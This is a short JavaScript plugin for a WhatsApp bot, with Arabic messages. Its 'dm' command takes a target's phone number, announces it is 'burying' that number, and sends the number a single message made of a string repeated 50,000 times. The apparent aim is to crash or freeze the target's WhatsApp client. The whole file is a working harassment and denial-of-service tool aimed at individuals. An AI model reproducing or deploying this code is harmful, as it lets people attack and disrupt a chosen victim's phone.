let handler = async (m, { conn, text, usedPrefix, command }) => {
  if (!text) throw `قم بإضافة رقم الشخص المستهدف بعد الأمر "dm". \n مثال: ${usedPrefix}dm + رقم الهاتف على واتساب`;

  let cleanedNumber = text.replace(/\+|\s|-/g, '');

  conn.reply(m.chat, `جاري قبر ${cleanedNumber}`, m);

  let message = '*~DarkMD~*' + '*~NessMD~*';
  let multipliedMessage = message.repeat(50000);

  for (let i = 0; i < 1; i++) {
    conn.reply(cleanedNumber + '@s.whatsapp.net', multipliedMessage, null, { contextInfo: { mentionedJid: [m.sender] } });
  }
};
handler.command = /^(dm)$/i;
handler.rowner = true;
export default handler;